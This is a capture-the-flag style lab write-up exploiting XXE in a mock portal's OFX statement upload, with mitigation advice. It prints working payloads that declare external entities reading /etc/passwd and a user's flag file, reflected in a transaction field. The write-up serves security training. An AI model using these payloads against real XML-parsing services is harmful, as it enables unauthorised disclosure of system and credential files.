---
title: "XXE Injection – Arbitrary File Disclosure via XML Import | Holloway"
date: 2026-05-13 15:46:00 +0530
categories: [Web Security, XXE]
tags: [xxe, xml-external-entity, file-read, webversepro, file-disclosure, php]
platform: WebVerse 
author: Shivansh Sharma
image:
  path: /assets/images/posts/holloway-xxe.webp
  alt: "XXE exploitation via XML import in client portal"
---

## Overview

This lab demonstrates an XML External Entity (XXE) vulnerability in a client portal feature that processes OFX bank statement uploads. The application parses XML input without properly restricting external entity resolution, allowing sensitive local file disclosure.

The issue appears in a reconciliation import feature where uploaded OFX files are parsed server-side.

## Lab Link

- Lab: [DocketHive – WebVerse](https://dashboard.webverselabs-pro.com/mystery-challenges/holloway)

---

## Objective

- Access the client portal
- Identify the statement import functionality
- Exploit XML parsing to read local files
- Retrieve sensitive data from the server

---

## Reconnaissance

During browsing, a client portal was discovered:

```
https://20c5d239-4065-holloway-1274c.events.webverselabs-pro.com/portal.php
```

Login was possible using basic/dummy credentials, which granted access to the account:

```
Margaret Holloway
```

Inside the portal, a reconciliation feature was found:

```
https://20c5d239-4065-holloway-1274c.events.webverselabs-pro.com/portal/import.php
```

This endpoint accepts OFX (XML-based) bank statement uploads.

---

## Exploitation

The import functionality was tested by uploading a sample OFX file. Intercepting the request revealed that the XML payload is processed server-side without proper entity restrictions.

To test for XXE, a malicious DOCTYPE declaration was injected.

### Payload (external entity definition)

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

### Full malicious OFX payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<OFX>
  <BANKMSGSRSV1>
    <STMTTRNRS>
      <STMTRS>
        <BANKACCTFROM>
          <BANKID>011600033</BANKID>
          <ACCTID>1234</ACCTID>
          <ACCTTYPE>CHECKING</ACCTTYPE>
        </BANKACCTFROM>

        <BANKTRANLIST>
          <DTSTART>20251101000000</DTSTART>
          <DTEND>20251130235959</DTEND>

          <STMTTRN>
            <TRNTYPE>DEBIT</TRNTYPE>
            <DTPOSTED>20251103</DTPOSTED>
            <TRNAMT>-1.00</TRNAMT>
            <NAME>&xxe;</NAME>
            <MEMO>test</MEMO>
          </STMTTRN>

        </BANKTRANLIST>
      </STMTRS>
    </STMTTRNRS>
  </BANKMSGSRSV1>
</OFX>
```

The entity `&xxe;` gets expanded during XML parsing, and its value is reflected in the response.

---

## Proof of Exploitation

The response revealed internal system data. From the output, a valid system user was identified:

```
cpa
```

Further exploitation was performed by targeting local file disclosure for that user:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///home/cpa/flag.txt">
]>
```

After resubmitting the modified payload, the server response included the flag content:

```
WEBVERSE{.....}
```

---

## Impact

This vulnerability allows:
- Arbitrary local file disclosure
- Potential server file system enumeration
- Possible credential leakage
- Risk of remote code execution in misconfigured XML parsers
- Exposure of sensitive internal user data

---

## Mitigation

To prevent this issue:
- Disable external entity processing in XML parsers
- Use secure XML parsing libraries (disable DTDs entirely if possible)
- Validate and sanitize uploaded OFX/XML files
- Enforce strict schema validation
- Run parsers in sandboxed environments
- Apply least privilege to file system access

---

## Real-World Insight

XXE vulnerabilities are still found in legacy XML-based integrations, especially in financial, banking, and document import systems. Features like file uploads and reconciliation tools are common entry points because they often rely on older parsing libraries.

Even when authentication is present, the attack surface remains in backend processing logic rather than the UI.